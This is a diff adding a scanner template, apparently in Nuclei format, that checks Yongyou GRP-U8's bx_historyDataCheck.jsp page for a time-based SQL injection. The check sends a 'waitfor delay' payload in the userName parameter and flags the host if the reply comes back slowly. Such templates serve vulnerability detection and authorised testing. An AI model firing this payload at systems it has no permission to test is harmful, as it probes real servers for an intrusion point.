@@ -1,0 +1,25 @@
+id: poc-yaml-yongyou-grpu8-sql-injection
+info:
+  name: Yongyou GRP-U8 bx_historyDataCheck SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+
+http:
+  - raw:
+      - |
+        GET /u8qx/bx_historyDataCheck.jsp?userName=1%27waitfor+delay%2700:00:{{t1}}&ysnd=0&historyFlag=2 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "trim(body) == '0'"
+          - "duration > to_number(t1)"
